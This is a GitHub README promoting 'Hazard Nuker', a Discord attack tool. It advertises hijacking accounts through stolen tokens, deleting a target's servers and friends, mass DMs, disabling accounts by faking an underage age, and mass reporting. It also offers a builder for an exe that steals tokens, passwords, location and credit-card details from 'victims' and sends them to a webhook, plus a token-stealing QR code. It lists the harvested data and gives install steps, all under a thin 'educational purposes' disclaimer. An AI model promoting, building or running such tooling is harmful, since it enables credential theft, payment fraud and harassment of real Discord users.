<p align= center</p><a href="https://rdimo.github.io/CheatAway/" target="_blank"><img src="https://cdn.discordapp.com/attachments/853347983639052318/858485202157699092/Hazard_Nuker_Banner.png" alt="HazardNuker"></a>
<p align="center">
<img src="https://img.shields.io/github/languages/top/Rdimo/Hazard-Nuker?style=flat-square" </a>
<img src="https://img.shields.io/github/last-commit/Rdimo/Hazard-Nuker?style=flat-square" </a>
 <img src="https://img.shields.io/github/license/Rdimo/Hazard-Nuker?style=flat-square" </a>
<img src="https://img.shields.io/github/watchers/Rdimo/Hazard-Nuker?color=%23daff00&label=Watchers&style=flat-square" </a>
<img src="https://img.shields.io/github/stars/Rdimo/Hazard-Nuker?color=%23daff00&label=Stars&style=flat-square" </a>
<img src="https://img.shields.io/github/forks/Rdimo/Hazard-Nuker?color=%23daff00&label=Forks&style=flat-square" </a>
</p>
<p align="center">
<a href="https://github.com/Rdimo/Hazard-Nuker#installation">Installation</a> |
<a href="https://github.com/Rdimo/Hazard-Nuker#Important">Important</a> |
<a href="https://github.com/Rdimo/Hazard-Nuker/blob/master/Changelog.md">Changelogs</a> |
<a href="https://rdimo.github.io/CheatAway/">Discord</a>
</p>

#### Hazard Nuker was made by
Love ❌
code ✅

### Features
* ` Many options while being compact`
* ` Auto update`
* ` Easy and fast`
* ` Nuke a targetted account`
* ` Unfriend all friends`
* ` DM all friends`
* ` delete and leave all servers`
* ` Spam Create New servers`
* ` Delete all private DM's`
* ` Spam switch between light/dark and languages`
* ` Get information from a targetted account`
* ` Log into an account thru the token`
* ` Disable Account`
* ` Status Changer`
* ` Create Token/Password/Creditcard Grabber`
* ` Create Qr code that grabs their token upon scanning`
* ` Mass report`
* ` Webhook destroyer`

<p align="center">
 <img alt="HazardNuker" src="https://cdn.discordapp.com/attachments/828047793619861557/889220130674991154/unknown.png" width="45%">
&nbsp; &nbsp; &nbsp; &nbsp;
 <img alt="HazardNukerUpdate" src="https://cdn.discordapp.com/attachments/853347983639052318/863399932240855060/unknown.png" width="45%">
</p>

#### [1] Nuke a targetted account 
* Spam switch from light to dark mode the whole time nuking
* Delete/leave every server they are in
* Will create 100 servers named whatever you want
* Change language from ja to zh-TW to ko to zh-CN
* Remove all friends
* Send a choosen message to every friend they have
* Everything will be logged and you can watch what happens on the cmd

#### [2] Unfriend all friends
removes all friend the user has

#### [3] delete and leave all servers
Leaves and deletes all the server the user has

#### [4] Spam Create New servers
Creates 100 new servers named whatever you want

#### [5] DM Deleter
Deletes all the private DM's the account has

#### [5] Mass DM
Messages all friends and group chats a message of your choice 

#### [7] Enable seizure mode
Switches between Light/dark mode as long as the console is open
also switches languages from ja to zh-TW to ko to zh-CN

#### [8] Get information from a targetted account
This is the info you get:
* User ID
* date account was created at
* Language
* Badges
* Avatar URL
* Token
* if they have 2fa on/off
* Email
* Phone number if they have one
* if they have nitro
* if they have nitro you get how many days they have it for 
* payment type (credit card/paypal)
* if the payment is valid
* name of the credit card/paypal
* credit card/paypal Holder Name
* credit card brand
* credit card number (not the whole)
* credit card expatriation date
* paypal email
* adress 1 and adress 2
* their city
* their postal code
* their state
* their country
* and if the payment method is their default
* if they have multiple credit cards connected you get those aswell

#### [9] Log into an account
Log into the account via their token
Make sure you have the correct Chromedriver.exe get it [here](https://chromedriver.chromium.org/downloads)
download the version corresponding to your chrome browsers version [How to get google version](https://www.businessinsider.com/what-version-of-google-chrome-do-i-have?op=1&r=US&IR=T)

#### [10] Disable Account
changes their age to below 13 which is against Tos and leads to their acc to being disabled

#### [11] Status Changer
Changes their status
Made this mainly if your lazy like me since you can just log into their account and change their status.

#### [12] Create Token Grabber
Creates a token grabber in exe form that you can send to your victims and get their info thru a webhook
Grabbs these Things upon running the exe :
* username
* user id
* Email
* phone
* nitro type
* billing info
* os
* pc username
* token location
* ip
* google maps location
* city
* region
* local language
* if they have verified email
* if 2fa is enabled
* creation date
* their discord token from all their accounts they have
* their password for discord (you get their password if they update it)
* all of their credit card info (if they put one in)

The webhook will look like [this](https://imgur.com/bgDXl1F)

#### [13] QR Code Grabber
Creates a QR code that will give you a discord user's token if they scan it

#### [14] Mass Report
Mass report a user of your choice
The account that will send the reports are the token that you put in

#### [15] Webhook Destroyer
Choose between deleting or spamming a webhook
Can customize the Duration of spam and the message being sent

#### [16] Exit
Exit the program
(press y to confirm exiting)

### ❗・Important
* Make sure to have [Python](https://www.python.org/downloads/) before [Downloading](https://github.com/Rdimo/Hazard-Nuker/archive/refs/heads/master.zip) Hazard
* Also make sure to have python added to [PATH](https://datatofish.com/add-python-to-windows-path/)
* Please Join the [discord server](https://rdimo.github.io/CheatAway/) or contact Rdimo#6969 on discord if you get any sort of major error with Hazard
* Some people have made a version of Hazard Nuker that looks/works like this one just that it's malicious, please make sure you only download stuff from here to make sure your info doesn't get stolen

### ⚙・Installation
```
git clone https://github.com/Rdimo/Hazard-Nuker.git
cd Hazard-Nuker
run install_requirements.cmd
run run.bat
```

|🌟Star This Repository If You Liked Hazard Nuker!|
|-------------------------------------------------|

<a href="https://rdimo.github.io/CheatAway/" target="_blank"><img src="https://discordapp.com/api/guilds/864857288584724500/widget.png?style=banner2" alt="Cheataway"/></a>

Created by Rdimo#6969 | https://rdimo.github.io/CheatAway
|⚠️・ Hazard Nuker was made for educational purposes.・⚠️|
|-------------------------------------------------|
By using HazardNuker, you agree that you hold responsibility and accountability of any consequences caused by your actions
